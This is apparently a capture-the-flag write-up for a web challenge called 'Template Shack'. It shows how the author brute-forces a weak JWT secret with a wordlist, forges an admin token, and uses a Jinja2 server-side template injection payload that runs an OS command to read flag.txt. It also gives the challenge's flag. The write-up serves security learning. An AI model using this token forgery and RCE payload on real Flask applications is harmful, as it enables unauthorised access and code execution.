---
layout: post
title: "Template Shack"
author: "INXS_JOY"
tags: ['Web']
---

Check out the coolest web templates online!

Connect here:
[http://jh2i.com:50023](http://jh2i.com:50023)

## Solution

* Having a look at the request header of the webpage, we notice that there is a JWT token in a cookie.

```
GET / HTTP/1.1
Host: jh2i.com:50023
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0
```

* Trying to brute force the secret key of the JWT token using this [tool](https://github.com/lmammino/jwt-cracker), we get the secret key: supersecret.

```
Command: 

python3 crackjwt.py eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y /usr/share/wordlists/rockyou.txt

Output:

Cracking JWT eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1ZXN0In0.9SvIFMTsXt2gYNRF9I0ZhRhLQViY-MN7VaUutz9NA9Y
291167it [00:26, 11150.29it/s]Found secret key: supersecret
291167it [00:26, 10911.29it/s]

```

* Now that we have the secret key for the JWT token, let's go to [jwt.io](https://jwt.io) and set the user name parameter to admin. Get the computed JWT and paste it into cookie token of the GET request /admin.

```
GET /admin HTTP/1.1
Host: jh2i.com:50023
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:68.0) Gecko/20100101 Firefox/68.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: token=eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6ImFkbWluIn0.Ykqid4LTnSPZtoFb11H-_2q-Vo32g4mLpkEcajK0H7I
Upgrade-Insecure-Requests: 1
```

* The /admin request gets us to a complicated looking admin panel where most of the buttons don't work but clicking on the charts or tables shows us a custom 404 Page. This can often lead to SSTI in Flask Web Applications and we can test this by sending /admin/{{2+2}}

> Pro Security tip: Don't reinvent the wheel. xD

![alt-text]({{site.baseurl}}/assets/Template-Shack/404.png)

* Using `/admin/{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag.txt').read()}}` payload, we are able to read the flag.txt file which was present in the current directory. You can read more about Jinga SSTI [here](https://www.onsecurity.co.uk/blog/server-side-template-injection-with-jinja2)

## Flag
```
flag{easy_jinja_SSTI_RCE}
```
